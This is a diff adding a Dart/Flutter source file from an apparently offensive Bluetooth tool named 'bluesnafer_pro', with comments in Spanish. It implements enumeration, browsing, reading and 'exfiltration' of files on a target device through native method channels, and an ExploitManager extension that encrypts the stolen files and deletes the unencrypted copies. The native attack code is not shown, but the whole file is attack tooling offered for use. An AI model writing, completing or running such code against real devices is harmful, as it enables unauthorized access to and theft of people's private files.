@@ -1,0 +1,668 @@
+import 'dart:convert';
+import 'dart:io';
+import 'package:flutter/services.dart';
+import '../utils/advanced_error_handler.dart';
+import '../utils/advanced_logger.dart';
+import '../exploits/exploit_manager.dart';
+import '../security/file_encryption.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+
+/// Excepción personalizada para errores de Bluetooth
+class BluetoothException implements Exception {
+  final String message;
+  BluetoothException(this.message);
+
+  @override
+  String toString() => 'BluetoothException: $message';
+}
+
+/// Implementa funcionalidades reales para acceder al sistema de archivos del dispositivo objetivo
+class BluetoothFileManager {
+  static const String _channelName = 'com.bluesnafer_pro/bluetooth';
+  static const String _fileChannelName = 'com.bluesnafer_pro/files';
+  static final _logger = AdvancedLogger('BluetoothFileManager');
+
+  // Comandos reales de acceso a archivos
+  static const String _enumFilesCommand = 'file:enum';
+  static const String _listDirectoryCommand = 'file:list';
+  static const String _browseFilesystemCommand = 'file:browse';
+
+  /// Enumerar archivos en el dispositivo objetivo
+  static Future<List<FileSystemEntry>> enumerateFiles(
+    String deviceAddress, {
+    String? path,
+    FileType? filter,
+    bool recursive = false,
+  }) async {
+    return AdvancedErrorHandler.executeWithRetry(
+      () => _executeFileEnumeration(deviceAddress,
+          path: path, filter: filter, recursive: recursive),
+      maxRetries: 3,
+      operationName: 'enumerate_files',
+    );
+  }
+
+  /// Listar contenido de un directorio
+  static Future<List<FileSystemEntry>> listDirectory(
+    String deviceAddress,
+    String path,
+  ) async {
+    return AdvancedErrorHandler.executeWithRetry(
+      () => _executeListDirectory(deviceAddress, path),
+      maxRetries: 2,
+      operationName: 'list_directory',
+    );
+  }
+
+  /// Leer contenido de un archivo
+  static Future<Uint8List?> readFile(
+    String deviceAddress,
+    String filePath, {
+    int offset = 0,
+    int? length,
+  }) async {
+    return AdvancedErrorHandler.executeWithRetry(
+      () => _executeReadFile(deviceAddress, filePath,
+          offset: offset, length: length),
+      maxRetries: 3,
+      operationName: 'read_file',
+    );
+  }
+
+  /// Exfiltrar archivo completo
+  static Future<bool> exfiltrateFile(
+    String deviceAddress,
+    String sourcePath,
+    String destinationPath, {
+    bool overwrite = false,
+  }) async {
+    return AdvancedErrorHandler.executeWithRetry(
+      () => _executeFileExfiltration(deviceAddress, sourcePath, destinationPath,
+          overwrite: overwrite),
+      maxRetries: 3,
+      operationName: 'exfiltrate_file',
+    );
+  }
+
+  /// Examinar sistema de archivos completo
+  static Future<FileSystemInfo> browseFilesystem(
+    String deviceAddress, {
+    int maxDepth = 3,
+    List<String>? extensions,
+  }) async {
+    return AdvancedErrorHandler.executeWithRetry(
+      () => _executeFilesystemBrowse(deviceAddress,
+          maxDepth: maxDepth, extensions: extensions),
+      maxRetries: 2,
+      operationName: 'browse_filesystem',
+    );
+  }
+
+  /// Verificar si un archivo existe
+  static Future<bool> fileExists(String deviceAddress, String filePath) async {
+    try {
+      final files = await enumerateFiles(deviceAddress, path: filePath);
+      return files.any((file) => file.path == filePath);
+    } catch (e) {
+      _logger.logDebug('File existence check failed',
+          {'path': filePath, 'error': e.toString()});
+      return false;
+    }
+  }
+
+  /// Obtener información detallada de un archivo
+  static Future<FileInfo?> getFileInfo(
+      String deviceAddress, String filePath) async {
+    try {
+      final files = await enumerateFiles(deviceAddress, path: filePath);
+      return files
+          .where((file) => file.path == filePath)
+          .cast<FileInfo?>()
+          .firstOrNull;
+    } catch (e) {
+      _logger.logDebug('File info retrieval failed',
+          {'path': filePath, 'error': e.toString()});
+      return null;
+    }
+  }
+
+  // Implementaciones internas
+
+  static Future<List<FileSystemEntry>> _executeFileEnumeration(
+    String deviceAddress, {
+    String? path,
+    FileType? filter,
+    bool recursive = false,
+  }) async {
+    try {
+      const platform = MethodChannel(_channelName);
+
+      final Map<String, dynamic> params = {
+        'deviceAddress': deviceAddress,
+        'command': _enumFilesCommand,
+      };
+
+      if (path != null) params['path'] = path;
+      if (filter != null) params['filter'] = filter.name;
+      if (recursive) params['recursive'] = true;
+
+      final result = await platform.invokeMethod('executeFileCommand', params);
+      final response = result.toString();
+
+      if (response.contains("ERROR") || response.contains("FAILED")) {
+        throw BluetoothException('File enumeration failed: $response');
+      }
+
+      return _parseFileEnumerationResponse(response);
+    } catch (e) {
+      _logger.logError(
+          'File enumeration failed',
+          {'device': deviceAddress, 'path': path},
+          e is Exception ? e : Exception(e.toString()));
+      throw BluetoothException('Failed to enumerate files: ${e.toString()}');
+    }
+  }
+
+  static Future<List<FileSystemEntry>> _executeListDirectory(
+    String deviceAddress,
+    String path,
+  ) async {
+    try {
+      const platform = MethodChannel(_channelName);
+
+      final result = await platform.invokeMethod('executeFileCommand', {
+        'deviceAddress': deviceAddress,
+        'command': _listDirectoryCommand,
+        'path': path,
+      });
+
+      final response = result.toString();
+      return _parseDirectoryListingResponse(response);
+    } catch (e) {
+      _logger.logError(
+          'Directory listing failed',
+          {'device': deviceAddress, 'path': path},
+          e is Exception ? e : Exception(e.toString()));
+      throw BluetoothException('Failed to list directory: ${e.toString()}');
+    }
+  }
+
+  static Future<Uint8List?> _executeReadFile(
+    String deviceAddress,
+    String filePath, {
+    int offset = 0,
+    int? length,
+  }) async {
+    try {
+      const platform = MethodChannel(_fileChannelName);
+
+      final Map<String, dynamic> params = {
+        'deviceAddress': deviceAddress,
+        'filePath': filePath,
+        'offset': offset,
+      };
+
+      if (length != null) params['length'] = length;
+
+      final result = await platform.invokeMethod('readFile', params);
+
+      if (result is Uint8List) {
+        return result;
+      } else if (result is Map && result['error'] != null) {
+        throw BluetoothException(result['error']);
+      }
+
+      throw BluetoothException('Invalid response format');
+    } catch (e) {
+      _logger.logError(
+          'File read failed',
+          {
+            'device': deviceAddress,
+            'path': filePath,
+            'error': e.toString(),
+          },
+          e is Exception ? e : Exception(e.toString()));
+      rethrow;
+    }
+  }
+
+  static Future<bool> _executeFileExfiltration(
+    String deviceAddress,
+    String sourcePath,
+    String destinationPath, {
+    bool overwrite = false,
+  }) async {
+    try {
+      const platform = MethodChannel(_fileChannelName);
+
+      final result = await platform.invokeMethod('exfiltrateFile', {
+        'deviceAddress': deviceAddress,
+        'sourcePath': sourcePath,
+        'destinationPath': destinationPath,
+        'overwrite': overwrite,
+      });
+
+      if (result is bool) return result;
+
+      if (result is Map && result['error'] != null) {
+        throw BluetoothException(result['error']);
+      }
+
+      throw BluetoothException('Invalid response format');
+    } catch (e) {
+      _logger.logError(
+          'File exfiltration failed',
+          {
+            'device': deviceAddress,
+            'source': sourcePath,
+            'destination': destinationPath,
+            'error': e.toString(),
+          },
+          e is Exception ? e : Exception(e.toString()));
+      rethrow;
+    }
+  }
+
+  static Future<FileSystemInfo> _executeFilesystemBrowse(
+    String deviceAddress, {
+    int maxDepth = 3,
+    List<String>? extensions,
+  }) async {
+    try {
+      const platform = MethodChannel(_channelName);
+
+      final Map<String, dynamic> params = {
+        'deviceAddress': deviceAddress,
+        'command': _browseFilesystemCommand,
+        'maxDepth': maxDepth,
+      };
+
+      if (extensions != null && extensions.isNotEmpty) {
+        params['extensions'] = extensions;
+      }
+
+      final result = await platform.invokeMethod('executeFileCommand', params);
+      final response = result.toString();
+
+      if (response.contains("ERROR") || response.contains("FAILED")) {
+        throw BluetoothException('Filesystem browse failed: $response');
+      }
+
+      return _parseFilesystemBrowseResponse(response);
+    } catch (e) {
+      _logger.logError(
+          'Filesystem browse failed',
+          {
+            'device': deviceAddress,
+            'error': e.toString(),
+          },
+          e is Exception ? e : Exception(e.toString()));
+      rethrow;
+    }
+  }
+
+  // Parseadores de respuesta
+
+  static List<FileSystemEntry> _parseFileEnumerationResponse(String response) {
+    final List<FileSystemEntry> entries = [];
+
+    try {
+      // Parsear respuesta JSON
+      final data = json.decode(response) as Map<String, dynamic>;
+
+      if (data.containsKey('files') && data['files'] is List) {
+        final files = data['files'] as List;
+
+        for (final fileData in files) {
+          if (fileData is Map<String, dynamic>) {
+            entries.add(FileSystemEntry.fromJson(fileData));
+          }
+        }
+      }
+    } catch (e) {
+      AdvancedLogger.staticLogger.logWarning(
+          'Failed to parse file enumeration response',
+          {'response': response, 'error': e.toString()});
+
+      // Fallback: parsear formato de texto simple
+      final lines = response.split('\n');
+      for (final line in lines) {
+        if (line.trim().isNotEmpty &&
+            !line.startsWith('SUCCESS') &&
+            !line.startsWith('ERROR')) {
+          entries.add(FileSystemEntry.fromString(line));
+        }
+      }
+    }
+
+    return entries;
+  }
+
+  static List<FileSystemEntry> _parseDirectoryListingResponse(String response) {
+    // Similar al método anterior pero específico para listados de directorio
+    return _parseFileEnumerationResponse(response);
+  }
+
+  static FileSystemInfo _parseFilesystemBrowseResponse(String response) {
+    try {
+      final data = json.decode(response) as Map<String, dynamic>;
+
+      return FileSystemInfo(
+        totalFiles: data['totalFiles'] ?? 0,
+        totalDirectories: data['totalDirectories'] ?? 0,
+        totalSize: data['totalSize'] ?? 0,
+        rootEntries: (data['rootEntries'] as List?)
+                ?.map((e) => FileSystemEntry.fromJson(e))
+                .toList() ??
+            [],
+        interestingFiles: (data['interestingFiles'] as List?)
+                ?.map((e) => FileSystemEntry.fromJson(e))
+                .toList() ??
+            [],
+      );
+    } catch (e) {
+      AdvancedLogger.staticLogger.logWarning(
+          'Failed to parse filesystem browse response',
+          {'response': response, 'error': e.toString()});
+
+      // Fallback básico
+      return FileSystemInfo(
+        totalFiles: 0,
+        totalDirectories: 0,
+        totalSize: 0,
+        rootEntries: [],
+        interestingFiles: [],
+      );
+    }
+  }
+}
+
+/// Información del sistema de archivos
+class FileSystemInfo {
+  final int totalFiles;
+  final int totalDirectories;
+  final int totalSize;
+  final List<FileSystemEntry> rootEntries;
+  final List<FileSystemEntry> interestingFiles;
+
+  FileSystemInfo({
+    required this.totalFiles,
+    required this.totalDirectories,
+    required this.totalSize,
+    required this.rootEntries,
+    required this.interestingFiles,
+  });
+}
+
+/// Entrada del sistema de archivos (archivo o directorio)
+class FileSystemEntry {
+  final String path;
+  final String name;
+  final FileType type;
+  final int size;
+  final DateTime? modifiedTime;
+  final bool isHidden;
+  final Map<String, dynamic>? attributes;
+
+  FileSystemEntry({
+    required this.path,
+    required this.name,
+    required this.type,
+    required this.size,
+    this.modifiedTime,
+    this.isHidden = false,
+    this.attributes,
+  });
+
+  factory FileSystemEntry.fromJson(Map<String, dynamic> json) {
+    return FileSystemEntry(
+      path: json['path'] ?? '',
+      name: json['name'] ?? '',
+      type: FileType.values.firstWhere(
+        (e) => e.name == (json['type'] ?? 'file'),
+        orElse: () => FileType.file,
+      ),
+      size: json['size'] ?? 0,
+      modifiedTime: json['modifiedTime'] != null
+          ? DateTime.tryParse(json['modifiedTime'])
+          : null,
+      isHidden: json['isHidden'] ?? false,
+      attributes: json['attributes'] as Map<String, dynamic>?,
+    );
+  }
+
+  factory FileSystemEntry.fromString(String line) {
+    // Parsear formato simple: "nombre tamaño tipo"
+    final parts = line.trim().split(RegExp(r'\s+'));
+    if (parts.length >= 2) {
+      return FileSystemEntry(
+        path: parts[0],
+        name: parts[0].split('/').last,
+        type: parts.length > 2 && parts[2].toLowerCase().contains('dir')
+            ? FileType.directory
+            : FileType.file,
+        size: int.tryParse(parts[1]) ?? 0,
+      );
+    }
+
+    return FileSystemEntry(
+      path: line,
+      name: line.split('/').last,
+      type: FileType.file,
+      size: 0,
+    );
+  }
+
+  Map<String, dynamic> toJson() {
+    return {
+      'path': path,
+      'name': name,
+      'type': type.name,
+      'size': size,
+      'modifiedTime': modifiedTime?.toIso8601String(),
+      'isHidden': isHidden,
+      'attributes': attributes,
+    };
+  }
+}
+
+/// Tipos de archivo
+enum FileType {
+  file,
+  directory,
+  symlink,
+  device,
+  socket,
+}
+
+/// Información detallada de un archivo
+class FileInfo extends FileSystemEntry {
+  final String mimeType;
+  final String permissions;
+  final String owner;
+  final String group;
+
+  FileInfo({
+    required super.path,
+    required super.name,
+    required super.type,
+    required super.size,
+    super.modifiedTime,
+    super.isHidden,
+    super.attributes,
+    this.mimeType = '',
+    this.permissions = '',
+    this.owner = '',
+    this.group = '',
+  });
+
+  @override
+  factory FileInfo.fromJson(Map<String, dynamic> json) {
+    final base = FileSystemEntry.fromJson(json);
+    return FileInfo(
+      path: base.path,
+      name: base.name,
+      type: base.type,
+      size: base.size,
+      modifiedTime: base.modifiedTime,
+      isHidden: base.isHidden,
+      attributes: base.attributes,
+      mimeType: json['mimeType'] ?? '',
+      permissions: json['permissions'] ?? '',
+      owner: json['owner'] ?? '',
+      group: json['group'] ?? '',
+    );
+  }
+
+  @override
+  Map<String, dynamic> toJson() {
+    final base = super.toJson();
+    return {
+      ...base,
+      'mimeType': mimeType,
+      'permissions': permissions,
+      'owner': owner,
+      'group': group,
+    };
+  }
+}
+
+/// Extensión para comandos de archivos en ExploitManager
+extension FileAccessCommands on ExploitManager {
+  /// Ejecutar comando de enumeración de archivos reales
+  Future<ExploitResult> executeFileEnumeration(String deviceAddress,
+      {String? path}) async {
+    try {
+      final files =
+          await BluetoothFileManager.enumerateFiles(deviceAddress, path: path);
+
+      return ExploitResult(
+        success: true,
+        message: 'File enumeration completed successfully',
+        data: {
+          'files_found': files.length,
+          'files': files.map((f) => f.toJson()).toList(),
+        },
+      );
+    } catch (e) {
+      return ExploitResult(
+        success: false,
+        message: 'File enumeration failed: ${e.toString()}',
+        data: {'error': e.toString()},
+      );
+    }
+  }
+
+  /// Ejecutar comando de exfiltración de archivos reales con cifrado automático
+  Future<ExploitResult> executeFileExfiltration(
+    String deviceAddress,
+    String sourcePath,
+    String destinationPath, {
+    bool overwrite = false,
+    bool encrypt = true, // Cifrar por defecto
+  }) async {
+    try {
+      // 1. Exfiltrar archivo
+      final success = await BluetoothFileManager.exfiltrateFile(
+        deviceAddress,
+        sourcePath,
+        destinationPath,
+        overwrite: overwrite,
+      );
+
+      if (!success) {
+        return ExploitResult(
+          success: false,
+          message: 'File exfiltration failed',
+          data: {
+            'source': sourcePath,
+            'destination': destinationPath,
+            'exfiltrated': false,
+          },
+        );
+      }
+
+      // 2. Verificar si debe cifrar
+      final prefs = await SharedPreferences.getInstance();
+      final shouldEncrypt = prefs.getBool('encrypt_files') ?? encrypt;
+
+      String finalPath = destinationPath;
+      bool encrypted = false;
+
+      if (shouldEncrypt) {
+        try {
+          // 3. Cifrar archivo exfiltrado
+          final file = File(destinationPath);
+          if (await file.exists()) {
+            final encryptedFile = await FileEncryption().encryptFile(file);
+
+            // 4. Eliminar archivo original sin cifrar
+            await file.delete();
+
+            finalPath = encryptedFile.path;
+            encrypted = true;
+
+            AdvancedLogger.staticLogger.logInfo('File encrypted', {
+              'original': destinationPath,
+              'encrypted': finalPath,
+            });
+          }
+        } catch (e) {
+          AdvancedLogger.staticLogger.logError('Encryption failed', {},
+              e is Exception ? e : Exception(e.toString()));
+          // Continuar aunque falle el cifrado
+        }
+      }
+
+      return ExploitResult(
+        success: true,
+        message: encrypted
+            ? 'File exfiltrated and encrypted successfully'
+            : 'File exfiltrated successfully',
+        data: {
+          'source': sourcePath,
+          'destination': finalPath,
+          'exfiltrated': true,
+          'encrypted': encrypted,
+        },
+      );
+    } catch (e) {
+      return ExploitResult(
+        success: false,
+        message: 'File exfiltration failed: ${e.toString()}',
+        data: {'error': e.toString()},
+      );
+    }
+  }
+
+  /// Ejecutar comando de navegación por el sistema de archivos
+  Future<ExploitResult> executeFileBrowsing(String deviceAddress) async {
+    try {
+      final fsInfo = await BluetoothFileManager.browseFilesystem(deviceAddress);
+
+      return ExploitResult(
+        success: true,
+        message: 'Filesystem browsing completed',
+        data: {
+          'total_files': fsInfo.totalFiles,
+          'total_directories': fsInfo.totalDirectories,
+          'total_size': fsInfo.totalSize,
+          'root_entries': fsInfo.rootEntries.map((e) => e.toJson()).toList(),
+          'interesting_files':
+              fsInfo.interestingFiles.map((e) => e.toJson()).toList(),
+        },
+      );
+    } catch (e) {
+      return ExploitResult(
+        success: false,
+        message: 'Filesystem browsing failed: ${e.toString()}',
+        data: {'error': e.toString()},
+      );
+    }
+  }
+}
+
+/// Extensiones útiles para tipos comunes
+extension ListExtensions<T> on List<T> {
+  T? get firstOrNull => isEmpty ? null : first;
+}
